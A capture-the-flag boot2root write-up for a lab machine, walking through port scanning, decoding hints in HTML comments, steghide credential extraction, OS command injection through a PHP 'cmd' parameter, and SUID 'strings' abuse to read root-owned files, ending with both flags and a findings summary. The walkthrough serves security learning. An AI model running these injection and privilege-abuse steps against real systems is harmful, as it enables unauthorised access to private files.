# Le Meffert — Complete Boot2Root Write-Up

## 1. Objective

Target: `10.10.0.16`

Goals:

- obtain `user.txt`;
- obtain `root.txt`.

The challenge combines web enumeration, encoding, steganography, command injection and SUID abuse.



## 2. Reconnaissance

A full TCP scan was performed:

```bash
nmap -sC -sV -p- --min-rate 5000 10.10.0.16
```

Results:

```text
22/tcp open  http  Apache httpd
80/tcp open  ssh   OpenSSH
```

The services were running on unusual ports:

- HTTP → port `22`
- SSH → port `80`

The web application was therefore available at:

```text
http://10.10.0.16:22
```



## 3. Web Enumeration

The home page source contained two important HTML comments.

The first one referenced:

```text
/recovery.php
```

The second one contained Base64 data.

It was decoded with:

```bash
echo '<BASE64_DATA>' | base64 -d
```

Result:

```text
The backup passwd is here, use it in last resort, in case you need a key or something:
5Uch_4_G3n1u5_cR34ToR
```

Recovered passphrase:

```text
5Uch_4_G3n1u5_cR34ToR
```



## 4. Recovery Page and Encoded Hint

The recovery page was requested:

```bash
curl -i http://10.10.0.16:22/recovery.php
```

The HTML contained another encoded comment.

It was decoded through several layers:

```bash
echo '<ENCODED_DATA>' \
| base64 -d \
| base32 -d \
| xxd -r -p
```

Result:

```text
You forgot again didnt you? remember: the cubes are the keys to everything
```

This indicated that the cube images had to be investigated.



## 5. Image Enumeration and Steganography

The images were downloaded:

```bash
wget -q http://10.10.0.16:22/assets/{cube_barrel.jpg,cube_ghost.jpg,cube_gold.jpg,cube_max.jpg,cube_void.jpg}
```

Initial inspection:

```bash
exiftool cube_*.jpg
strings cube_*.jpg
```

No useful plaintext was found.

The images were then tested with `steghide` using the previously recovered passphrase:

```bash
for f in cube_*.jpg; do
    echo "=== $f ==="
    steghide info "$f" -p '5Uch_4_G3n1u5_cR34ToR'
done
```

`cube_gold.jpg` contained an embedded file:

```text
embedded file "passwd"
encrypted: rijndael-128, cbc
compressed: yes
```

The hidden file was extracted:

```bash
steghide extract -sf cube_gold.jpg -p '5Uch_4_G3n1u5_cR34ToR'
cat passwd
```

Recovered credentials:

```text
Username: uweThePuzzleMaster
Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
```



## 6. Authentication to the Secret Website

The credentials were submitted to `recovery.php`:

```bash
curl -i -L -c cookies.txt -b cookies.txt \
  --data-urlencode 'user=uweThePuzzleMaster' \
  --data-urlencode 'pass=i_W4N7_70_C0Ll3C7_4Ll_Pu22l35' \
  http://10.10.0.16:22/recovery.php
```

Authentication succeeded and redirected to:

```text
/my_very_secret_dir/index.php
```

The page displayed:

```text
GET me a cmd and we'll talk!
```

This suggested a GET parameter named `cmd`.



## 7. Command Injection

Command execution was tested with:

```bash
curl -G -b cookies.txt \
  --data-urlencode 'cmd=id' \
  http://10.10.0.16:22/my_very_secret_dir/index.php
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed remote command execution as the Apache user `www-data`.

Further enumeration:

```bash
curl -G -b cookies.txt \
  --data-urlencode 'cmd=whoami; pwd; ls -la' \
  http://10.10.0.16:22/my_very_secret_dir/index.php
```

The vulnerable PHP code was also readable:

```php
if (isset($_GET['cmd'])){
    system($_GET['cmd']);
}
```

The vulnerability was therefore a direct OS command injection through the `cmd` GET parameter.



## 8. Local Enumeration

The available users were inspected:

```bash
cat /etc/passwd
```

Relevant account:

```text
uwe:x:1000:1000::/home/uwe:/bin/bash
```

The home directory existed but was protected:

```text
/home/uwe
```

`www-data` could not directly access:

```text
/home/uwe/user.txt
```

SUID binaries were then enumerated:

```bash
find / -perm -4000 -type f 2>/dev/null
```

An unusual binary was discovered:

```text
/usr/bin/x86_64-linux-gnu-strings
```

Permissions:

```bash
ls -l /usr/bin/x86_64-linux-gnu-strings
```

Result:

```text
-rwsr-sr-x 1 root root ... /usr/bin/x86_64-linux-gnu-strings
```

The SUID bit meant that `strings` executed with the effective privileges of its owner, `root`.



# Part 1 — User Flag

## 9. Reading `user.txt`

Although `www-data` could not access `/home/uwe`, the SUID `strings` binary could read protected files.

Command:

```bash
/usr/bin/x86_64-linux-gnu-strings /home/uwe/user.txt
```

Result:

```text
EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}
```

**User flag obtained successfully.**



# Part 2 — Root Flag

## 10. Reading `root.txt`

The same SUID misconfiguration could be used directly against `/root/root.txt`.

Command:

```bash
/usr/bin/x86_64-linux-gnu-strings /root/root.txt
```

Result:

```text
EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
```

**Root flag obtained successfully.**



## 11. Complete Attack Chain

```text
Nmap
→ discover HTTP on port 22 and SSH on port 80
→ inspect HTML source
→ discover /recovery.php
→ decode Base64 backup passphrase
→ decode Base64 + Base32 + Hex hint
→ investigate cube images
→ discover hidden file with Steghide
→ recover web credentials
→ authenticate to recovery.php
→ access secret page
→ discover cmd GET parameter
→ OS command injection
→ RCE as www-data
→ enumerate local users and SUID binaries
→ discover SUID root strings
→ read /home/uwe/user.txt
→ USER FLAG
→ read /root/root.txt
→ ROOT FLAG
```



## 12. Techniques and Tools

| Phase | Technique | Tool |
||||
| Reconnaissance | Full TCP and service scan | Nmap |
| Web enumeration | HTML/source inspection | curl |
| Encoding | Base64 decoding | base64 |
| Encoding | Base32 decoding | base32 |
| Encoding | Hex decoding | xxd |
| File analysis | Metadata inspection | exiftool |
| File analysis | Printable string extraction | strings |
| Steganography | Hidden file discovery/extraction | steghide |
| Authentication | Web form/session handling | curl |
| Exploitation | OS command injection | curl |
| Local enumeration | User and filesystem enumeration | id, ls, find |
| Privilege abuse | SUID binary abuse | strings |



## 13. Key Security Findings

### Information Disclosure

Sensitive information was exposed directly inside HTML comments.

### Weak Secret Storage

A useful passphrase was Base64-encoded rather than securely protected.

### Steganographic Credential Storage

Valid application credentials were hidden inside a publicly accessible image.

### OS Command Injection

The web application directly passed user-controlled input to:

```php
system($_GET['cmd']);
```

This allowed arbitrary command execution as `www-data`.

### Dangerous SUID Misconfiguration

`strings` was installed with the SUID bit and owned by `root`.

This allowed an unprivileged process to read files normally restricted to root, including:

```text
/home/uwe/user.txt
/root/root.txt
```



## 14. Conclusion

The room required chaining several weaknesses rather than exploiting a single vulnerability.

The complete compromise path was:

```text
Information disclosure
→ encoding puzzles
→ steganography
→ credential recovery
→ command injection
→ SUID abuse
→ full Boot2Root
```

Both objectives were successfully completed:

```text
USER: EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}
ROOT: EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
```
